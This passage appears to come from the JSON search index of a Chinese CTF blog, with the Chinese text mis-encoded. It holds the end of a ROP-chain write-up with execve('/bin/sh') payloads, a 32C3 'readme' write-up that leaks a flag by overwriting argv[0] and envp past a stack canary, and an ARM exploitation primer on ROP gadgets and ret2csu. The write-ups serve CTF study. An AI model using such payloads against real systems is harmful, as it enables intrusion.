p32(pop_edx_ecx_ebx_ret)\npayload += p32(0x0)+p32(0x0)+p32(0x080d7200)\npayload += p32(pop_eax_ret) + p32(0xb)\npayload += p32(int0x80)\n```\n\n(3)ä¸‹æ‹‰rspï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\npayload = \"\"\npayload += \"A\"*offset +p32(add_0x100) + p32(0x0)\n```\n\nâ–²è¿èµ·æ¥å°±æ˜¯ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\n#add esp\npayload = \"\"\npayload += \"A\"*offset +p32(add_0x100) + p32(0x0)\n\n#read /bin/sh\npayload += p64(pop_rax_ret) + p64(0x0)\npayload += p64(pop_rdi_ret) + p64(0x0)\npayload += p64(pop_rsi_ret) + p64(0x0069e200)\npayload += p64(pop_rdx_ret) + p64(0x200)\npayload += p64(syscall)\n\n#execve(\"/bin/sh\",0,0)\npayload += p64(pop_rax_ret) + p64(0x3b)\npayload += p64(pop_rdi_ret) + p64(0x0069e200)\npayload += p64(pop_rsi_ret) + p64(0x0)\npayload += p64(pop_rdx_ret) + p64(0x0)\npayload += p64(syscall)\npayload.ljust(0x100-4,'\\x00')\n\n#read /bin/sh\npayload += p32(pop_edx_ecx_edx_ret)\npayload += p32(0x200)+p32(0x080d7200)+p32(0x0)\npayload += p32(pop_eax_ret) + p32(0x3)\npayload += p32(int0x80)\n\n#execve(\"/bin/sh\",0,0)\npayload += p32(pop_edx_ecx_ebx_ret)\npayload += p32(0x0)+p32(0x0)+p32(0x080d7200)\npayload += p32(pop_eax_ret) + p32(0xb)\npayload += p32(int0x80)\n```\n\nå…¶ä»–çš„å°±æ˜¯æ‰¾ROPäº†ï¼Œè¿™ä¸ªä¸è¯´äº†ï¼Œè¿™é‡Œèƒ½æ‰¾åˆ°è¿™ä¹ˆå¤šgadgetï¼Œçº¯ç²¹å°±æ˜¯å› ä¸ºç¨‹åºæ˜¯é™æ€çš„ï¼Œgadgetæ— æ•Œå¤šï¼Œå¦‚æœä¸æ˜¯é™æ€çš„ï¼Œå¯èƒ½è¿˜å¾—è´¹ä¸€ç•ªåŠŸå¤«ã€‚\n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://www.dazhuanlan.com/bob24/topics/1295510\n\n \n\n \n","tags":["mimic"],"categories":["PWN","pwné¢˜å‹"]},{"title":"32C3 CTF-readme","url":"/2021/08/19/32C3 CTF-readme/","content":"\n1.å¸¸è§„checksecï¼Œå¼€äº†NX,Canary,FORTIFYã€‚ç„¶åIDAæ‰¾æ¼æ´ï¼Œsub_4007E0å‡½æ•°ä¸­ç¬¬ä¸€æ¬¡è¾“å…¥åå­—æ—¶å­˜åœ¨æ ˆæº¢å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n__int64 v3; // [rsp+0h] [rbp-128h]\n--------------------------------------------------------------------\n_IO_gets(&v3)\n```\n\n2.ç ”ç©¶ç¨‹åºï¼Œæœ‰æ•°æ®byte_600D20æç¤ºï¼Œç‚¹è¿›å»æç¤ºè¿œç¨‹ä¼šè¯»å–flagåˆ°è¿™ä¸ªåœ°æ–¹ï¼Œç”±äºè¿™é‡Œæœ‰Canaryå’Œæ ˆæº¢å‡ºï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥åˆ©ç”¨Canaryçš„æ£€æŸ¥å‡½æ•°___stack_chk_failæ¥æ³„éœ²ç¨‹åºä¸­byte_600D20å¤„çš„flagã€‚\n\n3.å‰ç½®çŸ¥è¯†ï¼š\n\n(1)libc2.24åŠä»¥ä¸‹çš„___stack_chk_failå‡½æ•°æ£€æŸ¥åˆ°canaryè¢«ä¿®æ”¹åï¼Œä¼šåœ¨ç¨‹åºç»“æŸæ—¶æ‰“å°*** stack smashing detected** â€ï¼š[**./readme.bin]** terminateã€‚è¿™é‡Œçº¢è‰²çš„éƒ¨åˆ†å°±æ˜¯ç¨‹åºåå­—ï¼Œç¨‹åºåˆå§‹åŒ–æ—¶å°±ä¼šè¯»å…¥å­˜å‚¨åˆ°argv[0]è¿™ä¸ªå‚æ•°é‡Œé¢ã€‚\n\n(éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç¨‹åºæœ€å¼€å§‹è¯»å…¥çš„æ˜¯ç¨‹åºçš„pwdç»å¯¹è·¯å¾„ï¼Œç±»ä¼¼äº/home/ctf/readme.binï¼Œä¹‹åä¼šåœ¨___stack_chk_failå‡½æ•°ä¸­å¯¹argv[0]ä¸­ä¿å­˜çš„å­—ç¬¦ä¸²è¿›è¡Œæ‹†è§£ï¼Œä»è€Œåªæ‰“å°å‡ºç¨‹åºåå­—)\n\n(2)ç”±äºargv[0]å‚æ•°æ˜¯mainå‡½æ•°çš„å‚æ•°ï¼Œç¨‹åºåˆå§‹åŒ–æ—¶å°±å­˜å‚¨åœ¨æ ˆä¸Šçš„è¾ƒé«˜åœ°å€å¤„ï¼Œæˆ‘ä»¬çš„è¾“å…¥è‚¯å®šæ˜¯åœ¨mainå‡½æ•°åŠä»¥åçš„å‡½æ•°æ ˆä¸­ï¼ŒåŸºæœ¬éƒ½å¤„äºè¾ƒä½åœ°å€å¤„ï¼Œæ‰€ä»¥ä¸€æ—¦æ ˆæº¢å‡ºè¶³å¤Ÿï¼Œé‚£ä¹ˆå°±å¯ä»¥è¦†ç›–åˆ°argv[0]ï¼Œä»è€Œå°†___stack_chk_failå‡½æ•°æ‰“å°ç¨‹åºåå­—çš„åœ°æ–¹è¦†ç›–æˆæˆ‘ä»¬æƒ³è¦çŸ¥é“çš„æŸä¸ªåœ°å€ä¸­çš„å€¼ï¼Œè¿™é‡Œä¹Ÿå°±æ˜¯flagï¼Œbyte_600D20ã€‚\n\n4.æ‰€ä»¥è¿›è¡Œè¶³å¤Ÿé•¿åº¦çš„è¦†ç›–ï¼Œå°†argv[0]è¦†ç›–ä¸º0x600d20ï¼Œä½†æ˜¯ç”±äºä»¥ä¸‹å‡½æ•°\n\n```\n#æ³¨é‡Šå¤´\n\nbyte_600D20[v0++] = v1;\n--------------------------------------------------------------------------\nmemset((void *)((signed int)v0 + 0x600D20LL), 0, (unsigned int)(32 - v0));\n```\n\nå³ä½¿æˆ‘ä»¬è¦†ç›–æ‰äº†argv[0]ï¼Œé‚£ä¹ˆæ‰“å°å‡ºæ¥çš„ä¹Ÿä¸ä¼šæ˜¯flagã€‚è¿™é‡Œéœ€è¦ç”¨åˆ°å¦ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š\n\nâ–²åŠ¨æ€åŠ è½½å™¨æ ¹æ®ç¨‹åºå¤´å°†ç¨‹åºæ˜ å°„åˆ°å†…å­˜ï¼Œç”±äºç¨‹åºæ²¡å¼€PIEï¼Œæ‰€ä»¥å„æ®µçš„åŠ è½½åœ°å€å‡å·²ç»å›ºå®šï¼Œflagä½äº0x600D20ï¼Œå¤„äºç¬¬äºŒä¸ªLOADä¸­ï¼Œä¼šè¢«æ˜ å°„åˆ°å†…å­˜ä¸­çš„ç¬¬ä¸€ä¸ªLOADä¸­ï¼Œæ‰€ä»¥0x600D20å¤„çš„flagå³ä½¿è¢«è¦†ç›–ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªLOADä¸­çš„flagä¾ç„¶å­˜åœ¨ã€‚æ‰€ä»¥è¿™é‡Œé€‰æ‹©å°†argv[0]è¦†ç›–ä¸ºç¬¬ä¸€ä¸ªLOADä¸­çš„flagã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191521279.jpeg)\n\nç¬¬ä¸€ä¸ªLOADä¸­çš„flagå¯»æ‰¾æ–¹æ³•ï¼Œpedaå¯ä»¥æŸ¥æ‰¾åˆ°ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191521727.jpeg)\n\n5.ç°åœ¨è€ƒè™‘å¯»æ‰¾argv[0]çš„ä½ç½®ï¼Œç”±äºæœ€å¼€å§‹è¯»å–çš„æ˜¯pwdç»å¯¹è·¯å¾„ï¼Œæ‰€ä»¥åˆ©ç”¨è¿™ä¸ªæ¥å¯»æ‰¾ï¼Œå°†æ–­ç‚¹ä¸‹åœ¨b *0x40080Eï¼Œè¿™é‡Œæˆ‘çš„ç»å¯¹è·¯å¾„æ˜¯/ctf/AAAAAAAAï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191521224.jpeg)\n\nä¸Šå›¾ä¸­ç”»çº¢çº¿çš„ä¸¤æ®µéƒ½æœ‰å¯èƒ½æ˜¯ï¼Œéƒ½å°è¯•ä¸€ä¸‹ï¼Œå¯ä»¥çŸ¥é“ç›¸å·®536å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€æ¡çº¢çº¿æ‰æ˜¯æ­£ç¡®çš„ã€‚\n\nç®€å•æ–¹æ³•ï¼šç›´æ¥ç”¨pwndbg>p &__libc_argv[0]\n\n6.å°è¯•ç¼–å†™payload:\n\n```\n#æ³¨é‡Šå¤´\n\npayload = \"\"\npayload += \"A\"*0x218\npayload += p64(flag_addr) #è¦†ç›–argv[0]\n```\n\nå´å‘ç°æ²¡åŠæ³•æ‰“å°å‡ºæ¥ï¼Œè¿*** stack smashing detected ***éƒ½æ²¡åŠæ³•æ¥å—åˆ°ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯è¿œç¨‹çš„ç¯å¢ƒå˜é‡å°†stderré”™è¯¯è¾“å‡ºæµè®¾ç½®ä¸º0ï¼Œåªæ‰“å°åœ¨è¿œç¨‹æœ¬åœ°ã€‚è¿™é‡Œç”¨socatæ­å»ºä¸€ä¸‹ï¼Œå¯ä»¥éªŒè¯å‡ºæ¥ï¼Œè¿œç¨‹æœ¬åœ°ä¸Šèƒ½æ‰“å°å‡ºæ¥ï¼š\n\n*** stack smashing detected ***: 32C3_TheServerHasTheFlagHere... terminated\n\n7.é‚£ä¹ˆå¦‚æœæƒ³é€šè¿‡è¯¥æ–¹æ³•è·å–è¿œç¨‹æ‰“å°çš„flagï¼Œå°±éœ€è¦å°†è¿œç¨‹çš„ç¯å¢ƒå˜é‡stderrè®¾ç½®ä¸º1ï¼Œä¹Ÿå°±æ˜¯LIBC_FATAL_STDERR_=1ã€‚é‚£ä¹ˆå¦‚ä½•ä¿®æ”¹è¿œç¨‹çš„ç¯å¢ƒå˜é‡å‘¢ï¼Œå¯ä»¥å†é€šè¿‡gdbè°ƒè¯•ï¼Œè¾“å…¥stack 100ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191521326.jpeg)\n\nè¿™é‡Œçš„536å°±æ˜¯æ‰€åœ¨argv[0]ï¼Œå†çœ‹ä¸‹ä¸‹é¢çš„ä¸€äº›æ•°æ®ï¼Œ552ï¼Œ556éƒ½æ˜¯ç¯å¢ƒå˜é‡ï¼Œé‚£ä¹ˆåœ¨è¿œç¨‹è‚¯å®šæ˜¯éœ€è¦è°ƒç”¨çš„ï¼Œè¿™é‡Œé€‰æ‹©ä¿®æ”¹552å¤„çš„ç¯å¢ƒå˜é‡ã€‚é‚£ä¹ˆä¹‹ååˆå¦‚ä½•å°†LIBC_FATAL_STDERR_=1ä¼ è¿‡å»å‘¢ï¼Ÿè¿™é‡Œå°±æƒ³åˆ°ç¨‹åºæœ‰ç¬¬äºŒä¸ªè¾“å…¥ï¼Œæœ¬æ¥ç”¨æ¥è¦†ç›–0x600D20çš„å°±å¯ä»¥è¢«åˆ©ç”¨äº†ã€‚é€šè¿‡ç¬¬äºŒæ¬¡è¾“å…¥å°†LIBC_FATAL_STDERR_=1ä¼ è¿‡å»ï¼Œä¿å­˜åœ¨0x600D20å‰é¢éƒ¨åˆ†ï¼Œä¹‹åå°†552å¤„çš„å†…å®¹ä¿®æ”¹ä¸º0x600D20ï¼Œè¿™æ ·ç¯å¢ƒå˜é‡å°±è¢«æ›´æ”¹äº†ã€‚\n\n8.æ€»Payload:\n\n```\n#æ³¨é‡Šå¤´\n\npayload = \"\"\npayload += \"A\"*0x218\npayload += p64(0x400D20) #è¦†ç›–argv[0]\npayload += p64(0)\npayload += p64(0x600D20) #è¦†ç›–ç¯å¢ƒå˜é‡envpæŒ‡é’ˆ\n```\n\n9.å‘é€å®Œpayloadåå†å‘é€LIBC_FATAL_STDERR_=1å°±å¯ä»¥å°†flagæ‰“å°åœ¨æœ¬åœ°äº†ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\næ¯”è¾ƒå¤šï¼Œç½‘ä¸Šä¸å¤ªå…¨ï¼Œè¿™ä¸ªæ¯”è¾ƒå…¨\n\nhttps://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200\n","tags":["canary"],"categories":["PWN","canaryç»•è¿‡0x9"]},{"title":"ARMåŸºç¡€","url":"/2021/08/19/ARMåŸºç¡€/","content":"\nä¸€ã€å‰ç½®ç¯å¢ƒï¼š\n\nå…ˆè¯´æ˜ä¸€ä¸‹aarch64å°±æ˜¯armæŒ‡ä»¤æ¶æ„çš„64ä½ç‰ˆæœ¬ï¼Œæœ‰ç›¸åŒï¼Œä¹Ÿæœ‰ä¸åŒçš„åœ°æ–¹ã€‚è€ŒThumbæŒ‡ä»¤é›†åŸºæœ¬å°±ç›¸å½“äº16ä½ç‰ˆæœ¬armæŒ‡ä»¤æ¶æ„ã€‚\n\n1.å®‰è£…äº¤å‰ç¼–è¯‘ç¯å¢ƒï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\nsudo apt-get install gcc-arm-linux-gnueabi\nsudo apt-get install gcc-aarch64-linux-gnu\n```\n\nç„¶åå°±æ­£å¸¸ç¼–è¯‘å³å¯\n\n```bash\n#æ³¨é‡Šå¤´\n\narm-linux-gnueabi-gcc file.c -o file\naarch64-linux-gnu-gcc file.c -o file\n```\n\n2.å®‰è£…è¿è¡Œç¯å¢ƒï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\nsudo apt-get install g++-arm-linux-gnueabihf\nsudo apt-get install pkg-config-aarch64-linux-gnu\n```\n\nè¿™æ ·å¯¹äºé™æ€çš„armæ¶æ„æ–‡ä»¶å¯ä»¥ç”¨qemuç›´æ¥è¿è¡Œäº†ï¼Œå½“ç„¶éœ€è¦qemuå¯¹åº”æ”¯æŒã€‚\n\n3.è°ƒè¯•æ–‡ä»¶ï¼š\n\n(1)qemuè¿è¡Œèµ·æ¥\n\n```bash\n#æ³¨é‡Šå¤´\n\nqemu-arm -g 12345 -L /usr/arm-linux-gnueabi/ ./file\nqemu-aarch64 -g 12345 -L /usr/aarch64-linux-gnu/ ./file\n```\n\nè¿™é‡Œ-gä»£è¡¨ç«¯å£æ˜ å°„çš„æ„æ€ï¼Œç”¨æ¥é…åˆå¤–é¢çš„gdbï¼Œè¿™é‡Œç”¨åˆ°ç«¯å£12345ã€‚\n\n-Lä»£è¡¨åŠ è½½è¿è¡Œåº“ï¼Œè¿™é‡Œå®‰è£…è¿è¡Œç¯å¢ƒä¹‹ååŸºæœ¬éƒ½åœ¨è¿™ä¸ªä½ç½®/usr/...../ã€‚\n\n(2)gdbè¿œç¨‹é™„åŠ è°ƒè¯•ï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\ngdb-multiarch -q ./file\ntarget remote localhost:12345\n```\n\nè¿™é‡Œä¸è®¾ç½®set architecture arm  set architecture aarch64ä¹Ÿè¡Œçš„ã€‚\n\nä¹‹åå°±æ­£å¸¸è°ƒè¯•ï¼Œä¸è¿‡ä¸­é€”æ–­ä¸‹æ¥éœ€è¦åœ¨qemuè¿è¡Œçš„ç»ˆç«¯åœ°æ–¹ctrl+cï¼Œè€Œä¸æ˜¯gdbå¤„ã€‚\n\n \n\näºŒã€åŸºç¡€å­¦ä¹ ï¼š\n\n1.å¯„å­˜å™¨ï¼š\n\nARMä¸­ï¼š(32ä½ç‰ˆæœ¬)\n\n![32](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs32.png)\n\nAARCH64ä¸­ï¼š(64ä½ç‰ˆæœ¬)\n\n![64](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs64.png)\n\n(1)R0~R3ï¼šå‡½æ•°è°ƒç”¨å‚æ•°ï¼Œä»£è¡¨ç¬¬0~4ä¸ªå‚æ•°ï¼Œå‰©ä¸‹çš„å‚æ•°ä»å³å‘å·¦ä¾æ¬¡å…¥æ ˆï¼Œå‡½æ•°è¿”å›å€¼ä¿å­˜åœ¨R0ä¸­ã€‚(å¯¹åº”åœ¨aarch64ä¸­ä¸ºR0~R7ï¼Œä½†æ˜¯gdbè°ƒè¯•æˆ–è€…IDAä¸­ä¸€èˆ¬æ˜¾ç¤ºX0~X30ï¼ŒåŒæ—¶è¿˜æœ‰ä½32ä½çš„W0~W30)\n\n(2)SPï¼šç±»ä¼¼rsp,espï¼Œæ ˆæŒ‡é’ˆ\n\n(3)FPï¼šç±»ä¼¼ebpï¼Œæ ˆæŒ‡é’ˆ\n\n(4)LRï¼šå½“å‘ç”Ÿå‡½æ•°è°ƒç”¨æ—¶ï¼Œä¼šä¿å­˜è°ƒç”¨å‡½æ•°å¤„çš„åœ°å€ï¼Œé€€å‡ºå‡½æ•°æ—¶èµ‹å€¼ç»™PCã€‚\n\n(5)PCï¼šç±»ä¼¼eip,ripï¼Œå­˜å‚¨ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚\n\n \n\n2.åŸºç¡€æŒ‡ä»¤ï¼š\n\n(1)STMä»¥åŠLDMæ˜¯æŒ‡ä»¤å‰ç¼€ï¼Œè¡¨ç¤ºå¤šå¯„å­˜å™¨å¯»å€ï¼Œæ¥è£…è½½å’Œå­˜å‚¨å¤šä¸ªå­—çš„æ•°æ®åˆ°å†…å­˜ï¼Œåé¢åŠ ä¸Šä¸åŒçš„åç¼€ä»£è¡¨ä¸åŒçš„æŒ‡ä»¤ï¼Œç±»ä¼¼çš„æœ‰STMFA,STMIB, LDMFA,LDMDAç­‰ç­‰ï¼š\n\nå¸¸è§çš„æœ‰FDï¼Œä»£è¡¨æ»¡æ ˆè½¬å­˜ï¼ŒEDä»£è¡¨ç©ºæ ˆè½¬å­˜ã€‚\n\nâ–²æ»¡æ ˆå’Œç©ºæ ˆï¼šæ»¡æ ˆæ“ä½œæ—¶SPæŒ‡å‘ä¸Šæ¬¡å†™çš„æœ€åä¸€ä¸ªæ•°æ®å•å…ƒï¼Œè€Œç©ºæ ˆçš„æ ˆæŒ‡é’ˆSPæŒ‡å‘ç¬¬ä¸€ä¸ªç©ºé—²å•å…ƒã€‚\n\nç±»ä¼¼æœ‰STMFD SP! { }å’ŒLDMFD SP! { }ï¼š\n\nå³ç›¸å½“äºpushå’Œpopï¼Œåœ¨gdbä¸­æ˜¾ç¤ºpushï¼Œpopï¼ŒIDAä¸­æ˜¾ç¤ºSTMFDå’ŒLDMFDã€‚\n\nSTMFD  SP!, {R11,LR}ï¼šå°†R11å’ŒLRå…¥æ ˆï¼Œç›¸å½“äºpush R11ä»¥åŠLRä¸­ä¿å­˜çš„å€¼å…¥æ ˆã€‚\n\nåŒç†LDMFDå³ç›¸å½“äºpopã€‚\n\n(2).STRæŒ‡ä»¤ï¼šå°†å‰æ“ä½œæ•°å¯„å­˜å™¨æ•°æ®å¤åˆ¶åˆ°åæ“ä½œæ•°åœ°å€å¯¹åº”çš„å†…å­˜ä¸Šï¼Œç±»ä¼¼mov\n\nSTR  r3, [fp, #-0xc]ï¼šå°†å¯„å­˜å™¨r3ä¸­çš„å€¼èµ‹ç»™fp-0xcåœ°å€å¯¹åº”çš„å†…å­˜ã€‚è¿™é‡Œfpå°±æ˜¯R11ã€‚\n\nSTR  r3, placeï¼šè¿™é‡Œæ˜¯èµ‹å€¼ç»™pc+placeåœ°å€å¯¹åº”å†…å­˜ã€‚\n\nç­‰ç­‰â€¦.\n\n(æ•°æ®å¤åˆ¶æ–¹å‘ï¼šå‰->å)\n\n(3).LDRæŒ‡ä»¤ï¼šä¹Ÿæ˜¯æŒ‡ä»¤å‰ç¼€ï¼Œåé¢ä¹Ÿä¼šè·Ÿä¸Šä¸€äº›ä¸åŒçš„åç¼€ï¼Œå¸¸è§æœ‰LDRBï¼ŒLDRHç­‰ç­‰ã€‚\n\nLDR R0ï¼Œ[R1,ï¼ƒ8]ï¼šå°†r1+8åœ°å€å¯¹åº”å†…å­˜å¤åˆ¶ç»™r0ã€‚\n\n(æ•°æ®å¤åˆ¶æ–¹å‘ï¼šå->å‰)\n\n(4).Bï¼šè·³è½¬æŒ‡ä»¤ï¼ŒåŒæ ·ä¹Ÿæ˜¯ç±»ä¼¼ä¸€ä¸ªå‰ç¼€æŒ‡ä»¤\n\nâ‘  Bï¼šç›´æ¥è·³è½¬ï¼Œç›®æ ‡åœ°å€æ˜¯ç›¸å¯¹äºå½“å‰PCå€¼çš„åç§»åœ°å€\n\nâ‘¡ BLï¼šè·³è½¬ä¹‹å‰ä¼šæŠŠPCå€¼å­˜åˆ°R14ï¼ˆLRï¼‰å¯„å­˜å™¨ä¸­ï¼Œé€šå¸¸ç”¨äºå‡½æ•°è°ƒç”¨ï¼Œä»è¢«è°ƒç”¨å‡½æ•°è¿”å›æ—¶ï¼Œé€šå¸¸éœ€è¦ç”¨åˆ°BX LR;æˆ–è€…MOV PC,LR;ç­‰\n\nâ‘¢BXï¼šè·³è½¬åˆ°ARMæŒ‡ä»¤æˆ–è€…ThumbæŒ‡ä»¤\n\nâ‘£BLXï¼šç»“åˆäº†BLå’ŒBXä¸¤ä¸ªæŒ‡ä»¤çš„åŠŸèƒ½ã€‚\n\n \n\nä¸‰ã€ARM(32ä½æ¶æ„)å‡½æ•°åˆ†ç±»ï¼š\n\n1.å¶å­å‡½æ•°ï¼šä¸åšä»»ä½•å…¶ä»–å‡½æ•°è°ƒç”¨çš„å‡½æ•°\n\nè°ƒç”¨æ—¶çš„æ ˆçŠ¶æ€åˆ†æï¼šå’Œæ­£å¸¸çš„x86å·®ä¸å¤šï¼Œå‹å…¥fpï¼Œsub spå¼€è¾Ÿæ ˆç©ºé—´ã€‚æœ€åé€šè¿‡Add sp,fp,#0å’Œpop{fp}å†åŠ ä¸ŠBX LRæ¥è¿”å›ã€‚\n\n![arm3](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsarm3.png)\n\n![arm4](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsarm4.png)\n\n\n\nFPä¸­çš„å†…å®¹æ˜¯ä¸Šä¸€ä¸ªå‡½æ•°æ ˆçš„FPæŒ‡é’ˆï¼Œå¹¶ä¸”æ ˆä¸Šä¸å­˜åœ¨å­˜æ”¾è¿”å›åœ°å€çš„åœ°æ–¹ï¼Œæ— æ³•ç›´æ¥åŠ«æŒè¿”å›åœ°å€ã€‚\n\nâ–²æ ˆæ¨¡å‹å¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n+-------------+\n|             |\n|  padding    |\n+-------------+\n|  Last FP    | <- frame pointer\n+-------------+\n```\n\nä½†æ˜¯è¿™æ ·å°±ä¸å¥½åˆ©ç”¨ï¼Œé‚£ä¹ˆå°±å°è¯•åŠ«æŒæ ˆè¿ç§»ä¸€æ®µè·ç¦»ï¼Œä½¿å¾—ä¸Šä¸€ä¸ªéå¶å­å‡½æ•°çš„å‰©ä¸‹çš„æ±‡ç¼–ä»£ç æ‰€ç”¨åˆ°çš„æ ˆä¸Šæ•°æ®æ˜¯æˆ‘ä»¬ä¼ªé€ çš„æ ˆä¸­çš„æ•°æ®ï¼Œè¿™æ ·å°±èƒ½å®ŒæˆåŠ«æŒä¸Šä¸€ä¸ªéå¶å­å‡½æ•°çš„è¿”å›åœ°å€ã€‚éœ€è¦å¯¹æ±‡ç¼–æœ‰ä¸€å®šåŠŸåŠ›ã€‚\n\n2.éå¶å­å‡½æ•°ï¼šå¤šäº†ä¸€ç‚¹ä¸åŒï¼Œå³ä¼šå‹å…¥FPæ—¶ï¼Œå°†LRä¹Ÿå‹å…¥ï¼Œä¸”LRå…ˆäºFPå‹å…¥ï¼Œå³å‡½æ•°æ ˆä¸­çš„FPæŒ‡å‘çš„æ˜¯ä¿å­˜çš„LRï¼Œè€Œä¸æ˜¯å¶å­å‡½æ•°ä¸­æŒ‡å‘çš„æ˜¯ä¸Šä¸€ä¸ªå‡½æ•°æ ˆçš„FPã€‚æœ€åé€šè¿‡sub sp,fp,#4åŠ ä¸Špop {fp,pc}æ¥è¿”å›ã€‚\n\nâ–²å…¶å®è¿”å›æ—¶addå’Œsubæ²¡å¤šå¤§å·®åˆ«ï¼Œåªé’ˆå¯¹åä¸¤ä¸ªæ“ä½œæ•°çš„ï¼Œä¹Ÿå°±ç«‹å³æ•°çš„ç¬¦å·ç›¸åå‘—ï¼Œåä¸¤ä¸ªæ“ä½œæ•°è®¡ç®—å®Œæˆåèµ‹å€¼ç»™spå®ç°æ ˆè¿˜åŸã€‚\n\nâ–²æ ˆæ¨¡å‹å¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n\n+-------------+\n|             |\n|  padding    |\n+-------------+\n| return_addr | <- frame pointer\n+-------------+\n|  Last FP    |\n+-------------+\n```\n\nè™½ç„¶FPä¸­çš„å†…å®¹å®é™…ä¸Šæ˜¯LRçš„å†…å®¹,ä½†å…¶å®ä¹Ÿå·®ä¸å¤šï¼Œåæ­£æœ€åè¿”å›æ—¶éƒ½ä¼šå‘ç”ŸSPç§»åŠ¨ï¼Œå…ˆå–FPï¼Œå†å–å¯¹åº”çš„PCï¼Œæ‰€ä»¥å®é™…æ€ä¹ˆæ ·ä¹Ÿæ— æ‰€è°“äº†ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191437383.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191437497.png)\n\nè¿™æ ·å°±ç›¸å½“äºå¸¸è§„çš„32ä½æ ˆæ¨¡å‹ebp-eipäº†ï¼Œåªä¸è¿‡ä¸æ¶‰åŠå‚æ•°ï¼Œä¸€èˆ¬éœ€è¦ç”¨gadgetæ¥ä¸ºå¯¹åº”å‚æ•°èµ‹å€¼ã€‚\n\nåœ¨å¸¸è§„æ ˆæº¢å‡ºæ—¶ï¼Œè¿™é‡Œå‘æŒ¥é‡è¦ä½œç”¨çš„å°±æ˜¯gadgets_addräº†ï¼Œä¸€èˆ¬å¯ä»¥å…ˆROPgadget --binary ./pwn --only \"pop\"ï¼ŒæŸ¥æ‰¾å¯¹åº”çš„pop gadgetã€‚ä¾‹å¦‚è¿™é‡Œå¯ä»¥æœ‰pop {r0, r4, pc}ï¼Œé‚£ä¹ˆå®Œæˆåˆ©ç”¨çš„æ ˆæ¨¡å‹å°±å¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n+-------------+\n|             |\n|  padding    |\n+-------------+\n|  padding    | <- frame pointer\n+-------------+\n|gadgets_addr | <- return address\n+-------------+\n|binsh_addr   |\n+-------------+\n|junk_data    |\n+-------------+\n|system_addr  |\n+-------------+\n```\n\nå°†binsh_addrèµ‹å€¼ç»™r0ï¼Œjunk_dataèµ‹å€¼ç»™r4ï¼Œsystem_addrèµ‹å€¼ç»™pcï¼Œå®Œæˆåˆ©ç”¨ã€‚\n\nâ˜…åœ¨æ ˆæº¢å‡ºæ¢ç´¢paddingæ—¶ï¼Œå¯ä»¥ç”¨pwndbgä¸­çš„cyclic 200è‡ªåŠ¨ç”Ÿæˆ200ä¸ªå­—ç¬¦ï¼Œç„¶åè¾“å…¥ï¼Œé‚£ä¹ˆåœ¨arm(32ä½)æ¶æ„ä¸‹çš„éå¶å­å‡½æ•°ä¸­ï¼Œä¸€å®šä¼šç»™pcèµ‹å€¼ä¸ºæˆ‘ä»¬çš„æŸä¸ªpaddingï¼Œè¿™æ—¶å€™ç¨‹åºæ–­ä¸‹æ¥ï¼Œå¯ä»¥æŸ¥çœ‹pcçš„å€¼ï¼Œç”¨cyclic -l [PCå€¼]æ¥æŸ¥æ‰¾æº¢å‡ºç‚¹ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191438678.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191438837.png)\n\nâ–²æ‰€ä»¥è¿™é‡Œå¦‚æœé’ˆå¯¹éå¶å­å‡½æ•°åŠ«æŒäº†FPå’ŒFP+4ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºåŠ«æŒæ ˆå¹¶ä¸”æ§åˆ¶ç¨‹åºæµäº†ï¼Œå¦‚æœæƒ³è°ƒç”¨å‡½æ•°è¿˜éœ€è¦è®¾ç½®å‚æ•°å¯„å­˜å™¨r0-r3æ‰è¡Œã€‚\n\nç®€å•çš„å¯ä»¥ç›´æ¥æŸ¥æ‰¾pop r0,pcä¹‹ç±»çš„ï¼šROPgadget --binary ./pwn --only \"pop\"ï¼Œè¿™ç§æ–¹å¼ä¸€èˆ¬åªèƒ½è°ƒç”¨ä¸€ä¸ªå‚æ•°çš„å‡½æ•°ã€‚\n\næ³„éœ²åœ°å€ä¹‹ç±»çš„ä¸€èˆ¬è¿˜æ˜¯éœ€è¦ç”¨åˆ°ret2csuï¼Œarm(32ä½)ä¸‹çš„ret2csuä¸€èˆ¬æ˜¯ç”¨åˆ°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n.text:0001049C                 LDR     R3, [R5],#4                 â‘¡\n.text:000104A0                 MOV     R2, R9\n.text:000104A4                 MOV     R1, R8\n.text:000104A8                 MOV     R0, R7\n.text:000104AC                 BLX     R3                          â‘¢\n.text:000104B0                 CMP     R6, R4\n.text:000104B4                 BNE     loc_10498\n.text:000104B8                 LDMFD   SP!, {R4-R10,PC}      